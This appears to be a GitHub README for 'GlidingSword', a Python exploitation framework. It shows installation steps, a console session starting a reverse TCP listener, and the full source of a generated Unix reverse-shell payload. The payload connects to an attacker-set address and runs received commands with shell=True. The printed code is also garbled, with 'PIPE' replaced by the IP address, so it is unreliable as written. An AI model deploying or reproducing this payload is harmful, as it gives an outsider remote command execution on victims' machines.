# GlidingSword
A full fledged exploitation framework written in pure python3.

## Installation
### Debian
```
$ sudo apt-get install python3 git
$ cd /opt/
$ sudo git clone https://github.com/MrSharkSpamBot/GlidingSword.git
$ cd GlidingSword/
$ sudo chmod +x GlidingSword
$ sudo cp GlidingSword /usr/bin/
```
### Arch
```
$ sudo pacman -S python git
$ cd /opt/
$ git clone https://github.com/MrSharkSpamBot/GlidingSword.git
$ cd GlidingSword/
$ sudo chmod +x GlidingSword
$ sudo cp GlidingSword /usr/bin/
```

## Usage
### Running a listener
```
$ GlidingSword


	░██████╗░██╗░░░░░██╗██████╗░██╗███╗░░██╗░██████╗░
	██╔════╝░██║░░░░░██║██╔══██╗██║████╗░██║██╔════╝░
	██║░░██╗░██║░░░░░██║██║░░██║██║██╔██╗██║██║░░██╗░
	██║░░╚██╗██║░░░░░██║██║░░██║██║██║╚████║██║░░╚██╗
	╚██████╔╝███████╗██║██████╔╝██║██║░╚███║╚██████╔╝
	░╚═════╝░╚══════╝╚═╝╚═════╝░╚═╝╚═╝░░╚══╝░╚═════╝░

	░██████╗░██╗░░░░░░░██╗░█████╗░██████╗░██████╗░
	██╔════╝░██║░░██╗░░██║██╔══██╗██╔══██╗██╔══██╗
	╚█████╗░░╚██╗████╗██╔╝██║░░██║██████╔╝██║░░██║
	░╚═══██╗░░████╔═████║░██║░░██║██╔══██╗██║░░██║
	██████╔╝░░╚██╔╝░╚██╔╝░╚█████╔╝██║░░██║██████╔╝
	╚═════╝░░░░╚═╝░░░╚═╝░░░╚════╝░╚═╝░░╚═╝╚═════╝░
	Created by Mr. Shark Spam Bot.

Listeners: 1
Payloads: 3
Payload Types: 1
    
GlidingSword> help     
Command Name        Command Usage        Command Description
------------        -------------        -------------------
help                help                 Get help.
exit                exit                 Exit out of Gliding Sword.
clear               clear                Clear the screen.
payloads            payloads             Go to the payloads menu.
listeners           listeners            Go to the listeners menu.
GlidingSword> listeners
GlidingSword/Listeners> help
Command Name        Command Usage        Command Description
------------        -------------        -------------------
back                back                 Go back one menu.
help                help                 Get help.
exit                exit                 Exit out of Gliding Sword.
clear               clear                Clear the screen.
list                list                 Show all the listeners.
use                 use LISTENER         Use a listener.
GlidingSword/Listeners> list
ShadowShark
GlidingSword/Listeners> use ShadowShark
GlidingSword/Listeners/ShadowShark> help
Command Name        Command Usage        Command Description
------------        -------------        -------------------
back                back                 Go back one menu.
info                info                 Get the listener info.
options             options              Check the options and their values.
help                help                 Get help.
run                 run                  Run a listener.
exit                exit                 Exit out of Gliding Sword.
clear               clear                Clear the screen.
set                 set OPTION VALUE     Set a value for the specified option.
GlidingSword/Listeners/ShadowShark> options
Option Name        Option Value       Option Description 
-----------        ------------       ------------------ 
LHOST                                 Your IP.           
LPORT                                 The port to send the connection to. 
ENCRYPTION                            The encryption used over TCP. 
GlidingSword/Listeners/ShadowShark> set LHOST 0.0.0.0
GlidingSword/Listeners/ShadowShark> set LPORT 8080
GlidingSword/Listeners/ShadowShark> set ENCRYPTION hex
GlidingSword/Listeners/ShadowShark> options
Option Name        Option Value       Option Description 
-----------        ------------       ------------------ 
LHOST              0.0.0.0            Your IP.           
LPORT              8080               The port to send the connection to. 
ENCRYPTION         hex                The encryption used over TCP. 
GlidingSword/Listeners/ShadowShark> run

	                                             ``
	                                       ``-+yhh-
	                                    `:ohNMMMy.                  `.-`
	                                `-ohNMMMMMM:                `.+hNy-
	             ``.-:+osyyyhhhhhdddmMMMMMMMMMm---:::--..``````+dMMMo
	      `:+syhdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNMMMMMo/-`                          ./o+
	  `+ymMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMms:`                 `:ohNMd:
	`oNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMdo-          -+ymMMMMy-
	 :NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNy/`  .+hNMMMMMNo.
	  `/+shdmymMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNhmMMMMMMMNo`
	  osdhdosydNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNo`
	  sdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMd/`
	   ``:shNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNy/.
	       ``./ohdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNdhhdmNMMMMMMNd+.
	             ``.-:/+osyhdmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNdhs+-`` ````.:+yhmNMMNh+.
	                       ```.-:/+syyyhhdMMMMMMMMddddddddddddddNMMMMdo/:...``               ```.-/oys:
	                                     `mMMMMMMM``````````````.sNMMh
	                                      -mMMMMMM.               .smMy`
	                                       .yMMMMMh`                `:ys.
	                                         :yNMMMh.
	                                           .odNMm:
	                                             `-/sh:
    
[*] A reverse TCP handler on 0.0.0.0:8080 has successfully started...
```
### Generate a payload
```
$ GlidingSword


	░██████╗░██╗░░░░░██╗██████╗░██╗███╗░░██╗░██████╗░
	██╔════╝░██║░░░░░██║██╔══██╗██║████╗░██║██╔════╝░
	██║░░██╗░██║░░░░░██║██║░░██║██║██╔██╗██║██║░░██╗░
	██║░░╚██╗██║░░░░░██║██║░░██║██║██║╚████║██║░░╚██╗
	╚██████╔╝███████╗██║██████╔╝██║██║░╚███║╚██████╔╝
	░╚═════╝░╚══════╝╚═╝╚═════╝░╚═╝╚═╝░░╚══╝░╚═════╝░

	░██████╗░██╗░░░░░░░██╗░█████╗░██████╗░██████╗░
	██╔════╝░██║░░██╗░░██║██╔══██╗██╔══██╗██╔══██╗
	╚█████╗░░╚██╗████╗██╔╝██║░░██║██████╔╝██║░░██║
	░╚═══██╗░░████╔═████║░██║░░██║██╔══██╗██║░░██║
	██████╔╝░░╚██╔╝░╚██╔╝░╚█████╔╝██║░░██║██████╔╝
	╚═════╝░░░░╚═╝░░░╚═╝░░░╚════╝░╚═╝░░╚═╝╚═════╝░
	Created by Mr. Shark Spam Bot.

Listeners: 1
Payloads: 3
Payload Types: 1
    
GlidingSword> help
Command Name        Command Usage        Command Description
------------        -------------        -------------------
help                help                 Get help.
exit                exit                 Exit out of Gliding Sword.
clear               clear                Clear the screen.
payloads            payloads             Go to the payloads menu.
listeners           listeners            Go to the listeners menu.
GlidingSword> payloads
GlidingSword/Payloads> help
Command Name        Command Usage        Command Description
------------        -------------        -------------------
back                back                 Go back one menu.
help                help                 Get help.
exit                exit                 Exit out of Gliding Sword.
clear               clear                Clear the screen.
list                list                 Show all the payload types.
use                 use PAYLOAD_TYPE     Use a payload type.
GlidingSword/Payloads> list
ShadowShark
GlidingSword/Payloads> use ShadowShark
GlidingSword/Payloads/ShadowShark> list
WindowsPayload
UnixPayload
OGPayload
GlidingSword/Payloads/ShadowShark> use UnixPayload
GlidingSword/Payloads/ShadowShark/UnixPayload> help
Command Name        Command Usage        Command Description
------------        -------------        -------------------
back                back                 Go back one menu.
info                info                 Get the payload info.
options             options              Check the options and their values.
help                help                 Get help.
generate            generate             Generate a payload.
exit                exit                 Exit out of Gliding Sword.
clear               clear                Clear the screen.
set                 set OPTION VALUE     Set a value for the specified option.
GlidingSword/Payloads/ShadowShark/UnixPayload> options
Option Name        Option Value       Option Description 
-----------        ------------       ------------------ 
LHOST                                 Your IP.           
LPORT                                 The port to send the connection to. 
GlidingSword/Payloads/ShadowShark/UnixPayload> set LHOST 192.168.1.21
GlidingSword/Payloads/ShadowShark/UnixPayload> set LPORT 8080
GlidingSword/Payloads/ShadowShark/UnixPayload> options
Option Name        Option Value       Option Description 
-----------        ------------       ------------------ 
LHOST              192.168.1.21       Your IP.           
LPORT              8080               The port to send the connection to. 
GlidingSword/Payloads/ShadowShark/UnixPayload> generate
[+] Successfully generated payload.

# -*- coding: utf-8 -*-
"""
A full fledged Shadow Shark payload for Unix.

@author: Mr. Shark Spam Bot
"""
import socket
import subprocess
import os
import codecs
import json
import platform
import getpass

BLUE = '\033[94m'
GREEN = '\033[92m'
NORMAL = '\033[0m'

def hex_handler(text, encode=False, decode=False):
    '''Encode or decode text using hex.'''
    if encode is True:
        new_text = text.encode()
        new_text = codecs.encode(new_text, encoding='hex')
        new_text = new_text.decode()
        new_text = json.dumps(new_text)
        new_text = new_text.encode()
    if decode is True:
        new_text = json.loads(text)
        new_text = new_text.encode()
        new_text = codecs.decode(new_text, encoding='hex')
        new_text = new_text.decode()
    return new_text

rev_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
rev_socket.connect(('192.168.1.21', 8080))

while True:
    command = b''
    while True:
        try:
            command = command + rev_socket.recv(1024)
            if not command:
                break
            if command[-1] == 34:
                break
        except ValueError:
            continue
    try:
        command = hex_handler(command, decode=True)
    except json.decoder.JSONDecodeError:
        continue

    if 'sudo' in command or 'su' in command:
        rev_socket.send(hex_handler('sudo and su are not supported.', encode=True))
        continue

    if command == 'exit':
        rev_socket.close()
        break

    if command == 'directory':
        user = getpass.getuser()
        system = platform.uname().node
        cwd = os.getcwd()
        if cwd.startswith(os.path.expanduser('~')):
            user_path = cwd.split(os.path.expanduser('~'))
            user_path = ''.join(user_path)
            prompt = f'{GREEN}{user}@{system}{NORMAL}:{BLUE}~{user_path}{NORMAL}$'
        else:
            prompt = f'{GREEN}{user}@{system}{NORMAL}:{BLUE}{cwd}{NORMAL}$'
        rev_socket.send(hex_handler(prompt, encode=True))
        continue

    output = subprocess.Popen(command, shell=True, stdout=subprocess.P192.168.1.21E, stderr=subprocess.P192.168.1.21E)
    try:
        stdout = output.stdout.read().decode()
    except UnicodeDecodeError:
        rev_socket.send(hex_handler('Could not send the data.', encode=True))
        continue
    if stdout:
        rev_socket.send(hex_handler(stdout, encode=True))
        continue
    stderr = output.stderr.read().decode()
    if stderr:
        rev_socket.send(hex_handler(stderr, encode=True))
        continue

    if command.startswith('cd') and len(command.split()) >= 2:
        try:
            os.chdir(command[3:])
        except IOError:
            rev_socket.send(hex_handler(f'bash: cd: {command[3:]}: No such file or directory', encode=True))
            continue

    rev_socket.send(hex_handler('\n', encode=True))

GlidingSword/Payloads/ShadowShark/UnixPayload> 
```
### General functionality
To terminate a listener use Ctrl + c. In all other cases use Ctrl + c to return to the main menu. This framework is user friendly and is not case-sensitive.
### OS support
Gliding Sword can run on any Linux system.
